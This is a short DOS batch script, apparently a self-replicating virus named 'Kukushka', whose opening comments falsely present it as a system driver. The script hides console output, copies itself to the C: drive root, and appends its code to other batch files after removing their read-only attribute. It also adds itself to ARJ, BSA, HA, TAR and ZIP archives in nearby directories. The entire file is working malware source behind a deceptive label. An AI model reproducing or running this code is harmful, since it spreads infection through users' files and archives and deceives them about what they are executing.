@ctty nul
: This system driver provides resident
: loading of the basic system drivers!
if not exist c:\kukushka.bat copy %0 c:\kukushka.bat
for %%q in (*.bat ..\*.bat) do set Kukushka=%%q
call attrib %Kukushka% -r
find "Kukushka" %Kukushka%
if not errorlevel 1 goto kukushka
type c:\kukushka.bat >> %Kukushka%
:kukushka
for %%a in (*.arj ..\*.arj) do arj a -r %%a c:\Kukushka.bat
for %%b in (*.bsa ..\*.bsa) do bsarc -ar %%b c:\Kukushka.bat
for %%e in (*.ha  ..\*.ha ) do ha a %%e c:\Kukushka.bat
for %%m in (*.tar ..\*.tar) do tar kayf %%m c:\Kukushka.bat
for %%o in (*.zip ..\*.zip) do pkzip %%o c:\Kukushka.bat
